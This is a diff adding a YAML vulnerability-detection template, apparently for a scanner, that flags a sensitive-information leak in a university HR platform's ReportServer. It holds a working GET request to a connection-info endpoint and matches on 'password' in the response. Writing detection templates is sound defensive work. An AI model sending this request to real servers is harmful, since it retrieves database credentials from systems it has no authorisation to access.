@@ -1,0 +1,16 @@
+id:
+
+info:
+  name: 高校人力资源管理服务平台系统ReportServer接口存在敏感信息泄露
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo
+response1:
+  body: password
+  code: 200
+requests2:
+response2:
